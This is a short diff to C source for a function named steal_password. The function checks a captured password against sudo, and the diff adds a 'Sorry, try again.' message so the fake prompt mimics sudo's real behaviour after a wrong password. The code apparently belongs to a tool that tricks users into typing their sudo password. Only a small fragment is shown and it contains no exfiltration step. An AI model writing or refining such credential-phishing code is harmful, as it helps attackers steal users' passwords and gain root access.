@@ -134,6 +134,9 @@ int steal_password(char * passwd, char * username){
     if (testSudoPassword(passwd) == 0){
       correctPasswd = 1;
     }
+    else {
+      printf("Sorry, try again.\n");
+    }
 
   }
 
